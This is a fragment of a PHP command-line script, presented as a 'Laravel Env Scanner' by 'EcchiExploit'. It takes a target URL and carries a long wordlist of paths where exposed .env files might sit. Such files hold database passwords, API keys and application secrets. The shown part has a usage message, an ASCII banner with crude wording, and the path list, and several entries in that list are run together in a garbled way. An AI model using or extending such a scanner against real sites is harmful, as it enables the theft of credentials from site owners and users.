...
@system("clear");
   if(!$argv[1]){
      print text."how to use : php laravel.php http://example.com\n"; 
      exit(1);
   }
   else {
      $web = $argv[1];
      ...
      echo pre."
               __                          __  ____
              / /  ___ ________ __  _____ / / / __/__ _  __
             / /__/ _ `/ __/ _ `/ |/ / -_) / / _// _ \ |/ /
            /____/\_,_/_/  \_,_/|___/\__/_/ /___/_//_/___/
      \n";
      echo fuck."($) Laravel Env Scanner Coded By ./EcchiExploit ($)\n\n";
   ...
   '/boxes/oracle-vagrant-boxes/OLCNE/.env/bucoffea/.env',
   '/build/.env',
   '/cardea/backend/.env',
   '/cdw-backend/.env',
   '/cgi-bin/.env',
   ...
   'examples/02-complex-example/.env/examples/03-one-to-many-relationship/.env',
   ...
   '/misc/.env',
   '/Modix/ClientApp/.env',
   '/monerod/.env/mongodb/config/dev/.env',
   ...
   '/packages/web/.env',
   '/packed/.env/page-editor/.env',
   '/parity/.env/Passportjs/.env',
   '/patchwork/.env/path/.env',
   '/pfbe/.env/pictures/.env',
   '/playground/.env',
   '/plugin_static/.env',
   ...
   '/services/deployment-agent/.env/services/documents/.env',
   ...
   '/services/registry/.env/services/simcore/.env',
   '/services/traefik/.env',
   '/sessions/.env/shared/.env',
   '/shibboleth/.env',
   '/shop/.env',
   '/Simple_server/.env',
   '/site-library/.env',
   ...
   '/src/renderer/.env/srv6_controller/controller/.env',
   ...
   '/testwork_json/.env',
   '/theme_static/.env/theme/.env',
   '/thumb/.env/thumbs/.env',
   '/tiedostot/.env',
   '/tmp/.env',
   '/tools/.env',
   '/Travel_form/.env',
